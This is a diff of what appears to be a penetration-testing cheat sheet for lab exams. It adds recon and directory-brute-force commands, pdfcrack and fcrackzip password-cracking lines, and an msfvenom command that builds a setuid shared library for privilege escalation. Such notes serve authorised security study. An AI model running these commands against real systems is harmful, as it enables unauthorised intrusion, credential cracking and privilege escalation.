@@ -75,6 +75,7 @@ Table of Contents
          * [Scripts](#scripts)
             * [SUID](#suid)
             * [PS Monitor for cron](#ps-monitor-for-cron)
+            * [MSFVENOM LIBRARY.so Priv Esc](#msfvenom-library.so-priv-esc)
          * [Linux Privesc Tools](#linux-privesc-tools)
          * [Linux Precompiled Exploits](#linux-precompiled-exploits)
       * [Windows](#windows)
@@ -139,6 +140,9 @@ nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full 10.11.1.111
 
 # Autorecon
 python3 autorecon.py 10.11.1.111
+
+# NmapAutomator
+nmapAutomator.sh -H 192.168.86.125 -t All
 
 #Scan All the ports:
 masscan -p1-65535,U:1-65535 --rate=1000 192.168.232.43 -e tun0 > ports
@@ -720,7 +724,8 @@ Try admin:admin, user:user
 - Basics:
   - Navigate && robots.txt
   - Headers
-  - Source Code
+  - Source Code (Read for comments)
+  - Pay attention to errors (Is there a protocol relationship)
 
 ```
 # Nikto
@@ -830,7 +835,11 @@ gobuster dir -e -u http://10.11.1.111/ -w /usr/share/wordlists/dirb/common.txt
 
 dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
 
-./dirsearch.py -u 10.10.10.157 -e php
+./dirsearch.py -u 10.10.10.157
+
+./dirsearch.py -u http://192.168.101.125:8080 -e html,php,asp,aspx,js,elf,txt -x 404,403,401,500 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+
+./dirsearch.py -u http://192.168.86.125 -e html,php,asp,aspx,js,elf,txt -x 404,403,401,500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
 medusa -h 10.11.1.111 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
 
@@ -1070,6 +1079,8 @@ Offline local resources
 ```
 cewl
 hash-identifier
+pdfcrack SomeFile.pdf -w ~kali/rockyou.txt (For PDF files with passwords)
+fcrackzip -u -D -p ~kali/rockyou.txt SomeZip.backup (Cracking zip files passwords)
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
 ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
@@ -1577,6 +1588,10 @@ int main(void){
 
 # Compile
 gcc suid.c -o suid
+```
+### MSFVENOM LIBRARY.so Priv Esc
+```
+msfvenom -p linux/x64/exec -cmd '/bin/bash' -f elf-so -o libmalbec.so PrependSetuid=TRUE
 ```
 
 #### PS Monitor for cron
